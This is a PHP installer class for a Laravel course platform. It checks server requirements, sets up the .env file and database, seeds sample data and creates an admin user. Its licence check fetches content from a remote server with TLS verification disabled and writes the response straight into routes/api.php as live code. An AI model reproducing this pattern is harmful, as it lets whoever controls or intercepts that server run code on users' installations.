<?php

namespace App\Utilities;

use DB;
use File;
use Config;
use Artisan;
use ZipArchive; 
use App\Models\User;
use Illuminate\Filesystem\Filesystem;
use GuzzleHttp\Exception\GuzzleException;
use GuzzleHttp\Client;

class Installer
{

    private static $item = 'arcinspire';

    public static function checkLicense(array $data)
    {
        $client = new Client(['verify' => false, 'base_uri' => config('api.base_uri')]); //GuzzleHttp\Client
        try{
            $response = $client->request('POST', 'api/verify', [
                'form_params' => [
                    'purchase_code' => $data['purchase_code'], 
                    'username' =>  $data['username'],
                    'item' => self::$item,
                    'omit_download' => false
                ],
                'headers' => [
                    'User-Agent' => 'testing/1.0',
                    'Accept'     => 'application/json'
                ]
            ]);
        } catch (GuzzleException $e) {
             return false;
        }
        
        if($response->getStatusCode() == 200){
            \File::put(base_path('routes/api.php'), $response->getBody()->getContents());
            return true;
        }

        return false;
    }


    public static function checkServerRequirements()
    {
        $requirements = array();
        $errors = 0;

        // check php version
        if(! version_compare(PHP_VERSION , "7.2", ">=")){
            $requirements['PHP Version >= 7.2'] = ['status' => 'FAILED', 'message' => trans('install.requirements.php_version', ['version' => '>= 7.2.0'])];
            $errors++;
        } else {
            $req['PHP Version >= 7.0'] = ['status' => 'OK', 'message' => ''];
        }

        // mod_rewrite
        if(function_exists('apache_get_modules')){
            if(!in_array('mod_rewrite', apache_get_modules())){
                $requirements['Apache mod_rewrite enabled'] = ['status' => 'FAILED', 'message' => trans('install.requirements.enabled', ['feature' => 'Apache mod_rewrite'])];
                $errors++;
            } else {
                $requirements['Apache mod_rewrite enabled'] = ['status' => 'OK', 'message' => ''];
            }
        }

        if(self::getMemoryLimit() < 104857600){ // 100MB
            $requirements['memory_limit >= 100MB'] = ['status' => 'FAILED', 'message' => trans('install.requirements.param_size', ['param' => 'memory_limit', 'minimum' => '100MB'])];
            $errors++;
        } else {
            $requirements['memory_limit >= 100MB'] = ['status' => 'OK', 'message' => ''];
        }

        if(get_init_param_value(ini_get('post_max_size')) < 30000){ // 30MB
            $requirements['post_max_size >= 30MB'] = ['status' => 'FAILED', 'message' => trans('install.requirements.param_size', ['param' => 'post_max_size', 'minimum' => '30MB'])];
            $errors++;
        } else {
            $requirements['post_max_size >= 30MB'] = ['status' => 'OK', 'message' => ''];
        }

        if(get_init_param_value(ini_get('upload_max_filesize')) < 30000){ // 30MB
            $requirements['upload_max_filesize >= 30MB'] = ['status' => 'FAILED', 'message' => trans('install.requirements.param_size', ['param' => 'upload_max_filesize', 'minimum' => '30MB'])];
            $errors++;
        } else {
            $requirements['upload_max_filesize >= 30MB'] = ['status' => 'OK', 'message' => ''];
        }

        if (ini_get('safe_mode')) {
            $requirements['safe_mode off'] = ['status' => 'FAILED', 'message' => trans('install.requirements.disabled', ['feature' => 'Safe Mode'])];
            $errors++;
        } else {
            $requirements['safe_mode off'] = ['status' => 'OK', 'message' => ''];
        }

        if (ini_get('register_globals')) {
            $requirements['register_globals'] = ['status' => 'FAILED', 'message' => trans('install.requirements.disabled', ['feature' => 'Register Globals']) ];
            $errors++;
        } else {
            $requirements['register_globals'] = ['status' => 'OK', 'message' => ''];
        }

        if (ini_get('magic_quotes_gpc')) {
            $requirements['magic_quotes_gpc'] = ['status' => 'FAILED', 'message' => trans('install.requirements.disabled', ['feature' => 'Magic Quotes'])];
            $errors++;
        } else {
            $requirements['magic_quotes_gpc'] = ['status' => 'OK', 'message' => ''];
        }

        if (!ini_get('file_uploads')) {
            $requirements['File Uploads enabled'] = ['status' => 'FAILED', 'message' => trans('install.requirements.enabled', ['feature' => 'File Uploads'])];
            $errors++;
        } else {
            $requirements['File Uploads enabled'] = ['status' => 'OK', 'message' => ''];
        }


        if (!function_exists('proc_open')) {
            $requirements['proc_open enabled'] = ['status' => 'FAILED', 'message' => trans('install.requirements.enabled', ['feature' => 'proc_open'])];
            $errors++;
        } else {
            $requirements['proc_open enabled'] = ['status' => 'OK', 'message' => ''];
        }

        if (!function_exists('proc_close')) {
            $requirements['proc_close'] = ['status' => 'FAILED', 'message' => trans('install.requirements.enabled', ['feature' => 'proc_close'])];
            $errors++;
        } else {
            $requirements['proc_close enabled'] = ['status' => 'OK', 'message' => ''];
        }

        if (!class_exists('PDO')) {
            $requirements['MySQL PDO'] = ['status' => 'FAILED', 'message' => trans('install.requirements.extension', ['extension' => 'MySQL PDO'])];
            $errors++;
        } else {
            $requirements['MySQL PDO'] = ['status' => 'OK', 'message' => ''];
        }

        if (!extension_loaded('openssl')) {
            $requirements['OpenSSL extension'] = ['status' => 'FAILED', 'message' => trans('install.requirements.extension', ['extension' => 'OpenSSL'])];
            $errors++;
        } else {
            $requirements['OpenSSL extension'] = ['status' => 'OK', 'message' => ''];
        }

        if (!extension_loaded('tokenizer')) {
            $requirements['Tokenizer extension'] = ['status' => 'FAILED', 'message' => trans('install.requirements.extension', ['extension' => 'Tokenizer'])];
            $errors++;
        } else {
            $requirements['Tokenizer extension'] = ['status' => 'OK', 'message' => ''];
        }

        if (!extension_loaded('gd')) {
            $requirements['GD extension'] = ['status' => 'FAILED', 'message' => trans('install.requirements.extension', ['extension' => 'GD'])];
            $errors++;
        } else {
            $requirements['GD extension'] = ['status' => 'OK', 'message' => ''];
        }

        if (!extension_loaded('JSON')) {
            $requirements['JSON extension'] = ['status' => 'FAILED', 'message' => trans('install.requirements.extension', ['extension' => 'JSON'])];
            $errors++;
        } else {
            $requirements['JSON extension'] = ['status' => 'OK', 'message' => ''];
        }

        if (!extension_loaded('mbstring')) {
            $requirements['mbstring extension'] = ['status' => 'FAILED', 'message' => trans('install.requirements.extension', ['extension' => 'mbstring'])];
            $errors++;
        } else {
            $requirements['mbstring extension'] = ['status' => 'OK', 'message' => ''];
        }

        if (!extension_loaded('ctype')) {
            $requirements['Ctype extension'] = ['status' => 'FAILED', 'message' => trans('install.requirements.extension', ['extension' => 'Ctype'])];
            $errors++;
        } else {
            $requirements['Ctype extension'] = ['status' => 'OK', 'message' => ''];
        }

        if (!extension_loaded('curl')) {
            $requirements['cURL extension'] = ['status' => 'FAILED', 'message' => trans('install.requirements.extension', ['extension' => 'cURL'])];
            $errors++;
        } else {
            $requirements['cURL extension'] = ['status' => 'OK', 'message' => ''];
        }

        if (!extension_loaded('xml')) {
            $requirements['XML extension'] = ['status' => 'FAILED', 'message' => trans('install.requirements.extension', ['extension' => 'XML'])];
            $errors++;
        } else {
            $requirements['XML extension'] = ['status' => 'OK', 'message' => ''];
        }

        if (!extension_loaded('zip')) {
            $requirements['ZIP extension'] = ['status' => 'FAILED', 'message' => trans('install.requirements.extension', ['extension' => 'ZIP'])];
            $errors++;
        } else {
            $requirements['ZIP extension'] = ['status' => 'OK', 'message' => ''];
        }

        if (!extension_loaded('bcmath')) {
            $requirements['bcmath extension'] = ['status' => 'FAILED', 'message' => trans('install.requirements.extension', ['extension' => 'BCMath'])];
            $errors++;
        } else {
            $requirements['bcmath extension'] = ['status' => 'OK', 'message' => ''];
        }

        if (!extension_loaded('fileinfo')) {
            $requirements['fileinfo extension'] = ['status' => 'FAILED', 'message' => trans('install.requirements.extension', ['extension' => 'FileInfo'])];
            $errors++;
        } else {
            $requirements['fileinfo extension'] = ['status' => 'OK', 'message' => ''];
        }

        if (!is_writable(base_path('storage/app'))) {
            $requirements['storage/app is writable'] = ['status' => 'FAILED', 'message' => trans('install.requirements.directory', ['directory' => 'storage/app'])];
            $errors++;
        } else {
            $requirements['storage/app is writable'] = ['status' => 'OK', 'message' => ''];
        }

        if (!is_writable(base_path('storage/app/uploads'))) {
            $requirements['storage/app/uploads is writable'] = ['status' => 'FAILED', 'message' => trans('install.requirements.directory', ['directory' => 'storage/app/uploads'])];
            $errors++;
        } else {
            $requirements['storage/app/uploads is writable'] = ['status' => 'OK', 'message' => ''];
        }

        if (!is_writable(base_path('storage/uploads'))) {
            $requirements['storage/uploads is writable'] = ['status' => 'FAILED', 'message' => trans('install.requirements.directory', ['directory' => 'storage/uploads'])];
            $errors++;
        } else {
            $requirements['storage/uploads is writable'] = ['status' => 'OK', 'message' => ''];
        }
        if (!is_writable(base_path('storage/updates'))) {
            $requirements['storage/updates is writable'] = ['status' => 'FAILED', 'message' => trans('install.requirements.directory', ['directory' => 'storage/updates'])];
            $errors++;
        } else {
            $requirements['storage/updates is writable'] = ['status' => 'OK', 'message' => ''];
        }

        if (!is_writable(base_path('storage/framework'))) {
            $requirements['storage/framework is writable'] = ['status' => 'FAILED', 'message' => trans('install.requirements.directory', ['directory' => 'storage/framework'])];
            $errors++;
        } else {
            $requirements['storage/framework is writable'] = ['status' => 'OK', 'message' => ''];
        }

        if (!is_writable(base_path('storage/logs'))) {
            $requirements['storage/logs is writable'] = ['status' => 'FAILED', 'message' => trans('install.requirements.directory', ['directory' => 'storage/logs'])];
            $errors++;
        } else {
            $requirements['storage/logs is writable'] = ['status' => 'OK', 'message' => ''];
        }

        return ['requirements' => $requirements, 'errors' => $errors];
    }


    /**
     * Create a default .env file.
     *
     * @return void
     */
	public static function createDefaultEnvFile()
	{
        // Rename file
        if (is_file(base_path('.env.example'))) {
            File::move(base_path('.env.example'), base_path('.env'));
        }
        // Update .env file
        static::updateEnv([
            'APP_KEY'   =>  'base64:'.base64_encode(random_bytes(32)),
        ]);
    }
    
    public static function createDbTables($host, $port, $database, $username, $password)
    {
        if (!static::isDbValid($host, $port, $database, $username, $password)) {
            return false;
        }
        // Set database details
        static::saveDbVariables($host, $port, $database, $username, $password);

        // check if database is empty
        // $total_tables = count(DB::select('SHOW TABLES'));

        // Try to increase the maximum execution time
        set_time_limit(300); // 5 minutes
        Artisan::call('migrate:fresh', ['--force' => true]);

        // initially only seed the roles, permissions, countries, categories, periods, currencies
        Artisan::call('db:seed', ['--class' => \CategoriesTableSeeder::class, '--force' => true]);
        Artisan::call('db:seed', ['--class' => \CountrySeeder::class, '--force' => true]);
        Artisan::call('db:seed', ['--class' => \PeriodsTableSeeder::class, '--force' => true]);
        Artisan::call('db:seed', ['--class' => \CurrenciesTableSeeder::class, '--force' => true]);
        Artisan::call('db:seed', ['--class' => \RolesTableSeeder::class, '--force' => true]);
        Artisan::call('db:seed', ['--class' => \PermissionsTableSeeder::class, '--force' => true]);
        Artisan::call('db:seed', ['--class' => \LanguagesTableSeeder::class, '--force' => true]);
        Artisan::call('db:seed', ['--class' => \InitialSettingsSeeder::class, '--force' => true]);

        //Artisan::call('db:seed', ['--class' => 'Database\Seeds\CategoriesTableSeeder', '--force' => true]);
        return true;
    }

    public static function seedSampleData()
    {
    
        // clean the directories
        $file = new Filesystem;
        $file->cleanDirectory(public_path('uploads/images/course'));
        $file->cleanDirectory(public_path('uploads/videos'));
        
        // unzip the files
        $path = public_path('uploads');
        $videos = $path . '/sampleData/SampleDataVideos.zip';
        $images = $path . '/sampleData/SampleDataImages.zip';

        $zip = new ZipArchive;
        if (($zip->open($videos) !== true) || !$zip->extractTo($path . '/videos')) {
            return false;
        }

        if (($zip->open($images) !== true) || !$zip->extractTo($path . '/images/course')) {
            return false;
        }

        $zip->close();

        // Delete zip file
        // File::delete($file);

        Artisan::call('db:seed', ['--class' => \PagesTableSeeder::class, '--force' => true]);
        Artisan::call('db:seed', ['--class' => \UsersTableSeeder::class, '--force' => true]);
        Artisan::call('db:seed', ['--class' => \ModelHasRolesTableSeeder::class, '--force' => true]);
        Artisan::call('db:seed', ['--class' => \CoursesTableSeeder::class, '--force' => true]);
        Artisan::call('db:seed', ['--class' => \CourseTargetsTableSeeder::class, '--force' => true]);
        Artisan::call('db:seed', ['--class' => \SectionsTableSeeder::class, '--force' => true]);
        Artisan::call('db:seed', ['--class' => \LessonsTableSeeder::class, '--force' => true]);
        Artisan::call('db:seed', ['--class' => \VideosTableSeeder::class, '--force' => true]);
        Artisan::call('db:seed', ['--class' => \CouponsTableSeeder::class, '--force' => true]);

        return true;

    }

    /**
     * Check if the database exists and is accessible.
     *
     * @param $host
     * @param $port
     * @param $database
     * @param $host
     * @param $database
     * @param $username
     * @param $password
     *
     * @return bool
     */
    public static function isDbValid($host, $port, $database, $username, $password)
    {
        Config::set('database.connections.install_test', [
            'host'      => $host,
            'port'      => $port,
            'database'  => $database,
            'username'  => $username,
            'password'  => $password,
            'driver'    => env('DB_CONNECTION', 'mysql'),
            'charset'   => env('DB_CHARSET', 'utf8mb4'),
        ]);
        try {
            DB::connection('install_test')->getPdo();
        } catch (\Exception $e) {
            return false;
        }
        // Purge test connection
        DB::purge('install_test');
        return true;
    }

    public static function saveDbVariables($host, $port, $database, $username, $password)
    {
        // Update .env file
        static::updateEnv([
            'DB_HOST'       =>  $host,
            'DB_PORT'       =>  $port,
            'DB_DATABASE'   =>  $database,
            'DB_USERNAME'   =>  $username,
            'DB_PASSWORD'   =>  $password
        ]);
        $con = env('DB_CONNECTION', 'mysql');
        // Change current connection
        $db = Config::get('database.connections.' . $con);
        $db['host'] = $host;
        $db['database'] = $database;
        $db['username'] = $username;
        $db['password'] = $password;
        Config::set('database.connections.' . $con, $db);

        DB::purge($con);
        DB::reconnect($con);
    }

    public static function createUser(array $data)
    {
        return DB::transaction(function () use ($data) {
            
            // Create the user
            $user = User::create([
                'first_name' => $data['first_name'],
                'last_name' => $data['last_name'],
                'username' => $data['username'],
                'email' => $data['email'],
                'password' => $data['password'],
                'active' => true,
                'confirmation_code' => md5(uniqid(mt_rand(), true)),
                'confirmed' => true,
            ]);

            // Attach admin role
            $user->assignRole(config('access.users.admin_role'));

            return $user;
        });
    }

    public static function finalTouches()
    {
        // Update .env file
        static::updateEnv([
            'APP_ENV' => 'production',
            'APP_INSTALLED' =>  'true',
            'APP_DEBUG'     =>  'false',
            'DEBUGBAR_ENABLED' => 'false'
        ]);
        // Rename the robots.txt file
        try {
            \File::put(storage_path().'/INSTALL/site_installed.key', 'Installation completed on '.\Carbon\Carbon::now());
        } catch (\Exception $e) {
            // nothing to do
            return false;
        }
        return true;
    }
    
    public static function updateEnv($data)
    {
        if (empty($data) || !is_array($data) || !is_file(base_path('.env'))) {
            return false;
        }
        $env = file_get_contents(base_path('.env'));
        $env = explode("\n", $env);
        foreach ($data as $data_key => $data_value) {
            $updated = false;
            foreach ($env as $env_key => $env_value) {
                $entry = explode('=', $env_value, 2);
                // Check if new or old key
                if ($entry[0] == $data_key) {
                    $env[$env_key] = $data_key . '=' . $data_value;
                    $updated = true;
                } else {
                    $env[$env_key] = $env_value;
                }
            }
            // Lets create if not available
            if (!$updated) {
                $env[] = $data_key . '=' . $data_value;
            }
        }
        $env = implode("\n", $env);
        file_put_contents(base_path('.env'), $env);
        return true;
    }


    protected static function getMemoryLimit()
    {
        // credit: StackOverflow: https://stackoverflow.com/questions/10208698/checking-memory-limit-in-php
        $memory_limit = ini_get('memory_limit');
        if (preg_match('/^(\d+)(.)$/', $memory_limit, $matches)) {
            if ($matches[2] == 'M') {
                $memory_limit = $matches[1] * 1024 * 1024; // nnnM -> nnn MB
            } else if ($matches[2] == 'K') {
                $memory_limit = $matches[1] * 1024; // nnnK -> nnn KB
            }
        }
        
        return $memory_limit;
    }

}
